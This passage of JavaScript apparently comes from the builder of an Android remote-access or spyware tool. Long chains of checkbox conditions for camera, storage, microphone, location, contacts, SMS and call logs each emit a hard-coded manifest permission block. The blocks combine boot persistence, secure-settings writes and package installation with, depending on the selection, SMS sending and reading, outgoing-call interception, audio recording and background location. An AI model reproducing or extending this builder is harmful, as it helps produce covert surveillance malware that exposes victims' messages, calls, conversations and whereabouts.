            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }



        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        //if four are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
